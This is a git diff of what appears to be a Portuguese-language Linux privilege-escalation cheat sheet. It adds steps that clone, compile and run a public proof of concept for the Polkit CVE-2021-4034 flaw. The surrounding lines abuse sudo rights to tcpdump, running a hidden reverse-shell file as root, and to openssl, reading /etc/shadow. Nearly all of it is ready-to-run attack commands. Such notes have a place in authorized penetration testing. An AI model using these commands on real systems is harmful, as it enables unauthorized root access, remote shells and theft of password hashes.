@@ -276,6 +276,12 @@ uid=0(root) gid=0(root) groups=0(root)
 # Caso o bin /usr/sbin/tcpdump seja (root) NOPASSWD: /usr/sbin/tcpdump
 sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.arquivo_com_shell_reversa -Z root
 
+# Escalar usando Polkit
+git clone https://github.com/arthepsy/CVE-2021-4034.git
+cd CVE-2021-4034
+gcc cve-2021-4034-poc.c -o poc
+./poc
+
 # Caso o bin /usr/bin/openssl seja (root) NOPASSWD para ler arquivos com permissões root
 sudo /usr/bin/openssl enc -in /etc/shadow
 
